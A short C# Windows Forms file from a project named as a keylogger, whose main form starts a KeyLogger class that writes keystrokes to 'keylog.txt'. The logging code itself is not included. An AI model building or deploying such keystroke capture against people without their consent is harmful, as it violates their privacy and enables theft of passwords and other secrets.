using System.Windows.Forms;

namespace WFormMyKeyLogger
{   
    public partial class MainForm : Form
    {
        string notepadPath = Application.StartupPath + @"\keylog.txt";

        public MainForm()
        {
            InitializeComponent();
            KeyLogger.Start(notepadPath);
        }
    }
}
